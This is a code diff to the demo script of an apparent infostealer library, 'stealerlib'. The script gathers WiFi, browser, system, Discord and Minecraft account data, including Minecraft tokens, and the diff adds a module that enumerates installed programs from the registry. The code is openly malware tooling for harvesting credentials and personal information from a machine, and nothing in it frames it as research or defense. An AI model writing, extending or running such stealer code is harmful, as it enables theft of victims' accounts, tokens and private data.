@@ -8,6 +8,7 @@
 from stealerlib.wifi import WiFi
 from stealerlib.system import System
 from stealerlib.browser import Browser
+from stealerlib.registry import Registry
 
 from stealerlib.apps.discord import Discord
 from stealerlib.apps.minecraft import Minecraft
@@ -34,6 +35,7 @@ if __name__ == '__main__':
     system  = System()
     browser = Browser()
     network = WiFi()
+    registry = Registry()
     discord = Discord()
     minecraft = Minecraft()
 
@@ -81,8 +83,11 @@ if __name__ == '__main__':
     print('Minecraft Accounts:', minecraft.accounts, '\n') # conv=True ->  [(email, username, uuid, token), ...]
                                                            # conv=False -> [MinecraftTypes.Account, ...]
 
-    # windows specific system information grabber
-    print(system.comp_info,
-          system.os_info,
-          system.proc_info,
-          system.gpu_info)
+    registry.get_installed_programs(conv=conv)
+    print('Installed Programs:', registry.programs, '\n')
+
+
+    #print(system.comp_info,
+          #system.os_info,
+          #system.proc_info,
+          #system.gpu_info)
